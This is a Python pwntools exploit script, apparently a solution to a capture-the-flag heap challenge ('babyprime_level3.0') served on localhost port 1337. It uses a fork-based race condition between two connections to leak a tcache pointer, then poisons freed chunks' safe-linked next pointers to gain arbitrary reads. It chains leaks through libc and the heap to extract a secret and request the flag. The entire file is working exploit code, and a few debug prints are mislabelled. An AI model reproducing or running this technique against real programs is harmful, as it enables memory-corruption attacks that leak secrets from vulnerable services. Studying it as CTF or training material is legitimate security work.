import time 
from pwn import *
import os


offset1 = 0x8a0 # from heap base to libc
offset2 = 0x60 # from libc to main heap 
offset3 = 0x250 # from main heap to secret's region
offset4 = 0xd70 # secret's address to secret
idx = 2

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr):
	global idx
	r1.clean()
	r2.clean()
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	r1.sendline(f"malloc {idx}".encode()) # chunk A
	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
	r1.sendline(f"free {idx + 1}".encode()) # free B
	
	while True:
		print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free {idx}".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
		r1.sendline(f"printf {idx}".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #
	#	print(addr_packed.split(b'\x00')[0])
		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break
	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
	r1.clean()
	idx += 2

def arbitrary_read(r1, r2, addr, heap_base_addr):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr)
	r1.sendline(f"printf {idx - 1}".encode())
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 

	return leak
	
def exploit(r1, r2, p):
	global offset1
	global offset2
	global offset3
	global offset4
	
	leak = leak_tcache(r1, r2)
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		location1 = (leak << 12) + offset1
		#print(f"\nGDB: gdb -p {p.pid}")
		#pause()
		leak2 = arbitrary_read(r1, r2, location1, leak)
		print("second leak: ", hex(leak2))


		location2 = leak2 + offset2
		print("location2: ", hex(location2))
		print(f"\nGDB: gdb -p {p.pid}")
		pause()	
		leak3 = arbitrary_read(r1, r2, location2, leak + 1)
		print("Third leak: ", hex(leak2))

		
		location3 = leak3 - offset3
		print("location3: ", hex(location3))
		print(f"\nGDB: gdb -p {p.pid}")
		#pause()
		leak4 = arbitrary_read(r1, r2, location3, leak + 1)
		print("location2: ", hex(leak4))
		
		
		location4 = leak4 - offset4
		print("location3: ", hex(location3))
		print(f"\nGDB: gdb -p {p.pid}")
		#pause()
		secret = arbitrary_read(r1, r2, location4, leak + 2)
		secret = secret.to_bytes(8, 'little')
		print(f"Secret string: {secret}")
		

		r1.clean()
		r1.sendline(b"send_flag")
		r1.recvuntil(b"Secret: ")
		r1.sendline(secret)
		response = r1.recvall(timeout=2)
		print(f"Server response: {response}")	
		return True	
	else:
		#pause()
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level3.0_patched'
			p = process(binary)
			r1 = remote("localhost", 1337)
			r2 = remote("localhost", 1337)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
